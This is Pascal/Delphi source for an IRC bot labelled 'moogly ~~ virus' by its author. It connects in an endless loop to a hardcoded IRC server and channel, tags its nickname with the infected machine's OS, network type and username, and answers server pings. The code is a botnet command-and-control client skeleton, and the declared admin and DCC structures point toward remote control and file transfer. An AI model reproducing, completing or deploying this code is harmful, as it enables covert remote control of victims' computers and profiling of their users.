   {  moogly ~~ virus  }
   {  ~coded by p0ke~  }

   program moogly;

   uses
     Windows, Winsock, pFunc;

   type
     tdcc = record
       nick: string;
       fil : string;
     end;
     pdcc = ^tdcc;

     tadmin = record
       nick: string;
       loggedin: bool;
     end;

   const
     title         = 'bot\moogly - coded by p0ke';
     version       = '1.0';
     address       = 'irc.sadisticnet.org';
     port          = 6667;
     channel       = '#mychan';
     key           = 'mykey';
     password      = 'mypass';
     nick          = 'p0key';

     // %net%      =    puts L for"LAN" or D for "DIAL-UP" infront of nick.
     // %os%       =    puts 95, 98, me, 2k, xp, or un infront of nick.
     // %user%     =    puts username infront of nick.

   var
     admins: array[0..255] of TAdmin;
     sock  : tsocket;
     addr  : tsockaddrin;
     wsa   : twsadata;
     stopbot: bool;

   procedure senddata(text: string); begin
   send(sock, text[1], length(text), 0);end;

   procedure readdata;
   var
     bot_nick: string;
     bot_ident: string;
     buf: array[0..1600] of char;
     data: string;
   begin
     bot_nick := nick;
     replacestr('%net%' , getnet[1] , bot_nick);
     replacestr('%os%'  , getos  , bot_nick);
     replacestr('%user%', getuser, bot_nick);
     bot_ident := bot_nick+' '+bot_nick+'@'+getuser+'.com "'+GetOs+'" :'+bot_nick;

     senddata('USER '+bot_ident+#10);
     senddata('NICK '+bot_nick +#10);

     While Recv(Sock, Buf, 1600, 0) > 0 Do
     Begin
       Data := Buf;
       ZeroMemory(@Buf, SizeOf(Buf));

       if pos('Nickname is already in use', data) > 0 then
       begin
         randomize;
         senddata('NICK '+bot_nick+inttostr(random(999999))+#10);
       end;

       if pos('PING :', data) > 0 then
       begin
         data := copy(data, pos('PING :', data), pos(#10, data)-1);
         delete(data, 2, 1);
         insert('O', data, 2);
         senddata(data+#10);
       end;

       if pos('MOTD', data) > 0 then
       begin
         senddata('MODE '+channel+#10);
         senddata('JOIN '+channel+' '+key+#10);
       end;

     End;
   end;

   procedure startbot;
   begin
     stopbot := false;
     repeat
     wsastartup(257, wsa);

     sock := socket(af_inet, sock_stream, 0);
     addr.sin_family := af_inet;
     addr.sin_port := htons(port);
     addr.sin_addr.S_addr := inet_addr(pchar(ipstr(address)));

     if connect(sock, addr, sizeof(addr)) = error_success then
       readdata;

     wsacleanup;
     until stopbot;
   end;

   begin
     StartBot;
   end.
